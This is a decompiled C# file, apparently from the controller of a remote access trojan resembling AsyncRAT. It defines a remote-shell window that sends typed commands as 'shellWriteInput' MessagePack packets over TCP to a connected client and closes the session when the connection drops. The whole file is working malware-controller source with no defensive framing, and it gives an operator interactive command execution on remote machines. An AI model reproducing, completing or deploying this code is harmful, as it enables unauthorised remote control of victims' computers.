﻿using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms
{
	// Token: 0x0200009D RID: 157
	public partial class FormShell : Form
	{
		// Token: 0x170000DC RID: 220
		// (get) Token: 0x060004DD RID: 1245 RVA: 0x000048FC File Offset: 0x00002AFC
		// (set) Token: 0x060004DE RID: 1246 RVA: 0x00004904 File Offset: 0x00002B04
		public Form1 F { get; set; }

		// Token: 0x170000DD RID: 221
		// (get) Token: 0x060004DF RID: 1247 RVA: 0x0000490D File Offset: 0x00002B0D
		// (set) Token: 0x060004E0 RID: 1248 RVA: 0x00004915 File Offset: 0x00002B15
		internal Clients Client { get; set; }

		// Token: 0x060004E1 RID: 1249 RVA: 0x0000491E File Offset: 0x00002B1E
		public FormShell()
		{
			this.InitializeComponent();
		}

		// Token: 0x060004E2 RID: 1250 RVA: 0x000315F0 File Offset: 0x0002F7F0
		private void TextBox1_KeyDown(object sender, KeyEventArgs e)
		{
			if (this.Client != null && e.KeyData == Keys.Return && !string.IsNullOrWhiteSpace(this.textBox1.Text))
			{
				if (this.textBox1.Text == "cls".ToLower())
				{
					this.richTextBox1.Clear();
					this.textBox1.Clear();
				}
				if (this.textBox1.Text == "exit".ToLower())
				{
					base.Close();
				}
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "shellWriteInput";
				msgPack.ForcePathObject("WriteInput").AsString = this.textBox1.Text;
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				this.textBox1.Clear();
			}
		}

		// Token: 0x060004E3 RID: 1251 RVA: 0x000316DC File Offset: 0x0002F8DC
		private void FormShell_FormClosed(object sender, FormClosedEventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "shellWriteInput";
			msgPack.ForcePathObject("WriteInput").AsString = "exit";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x060004E4 RID: 1252 RVA: 0x00031738 File Offset: 0x0002F938
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}
	}
}
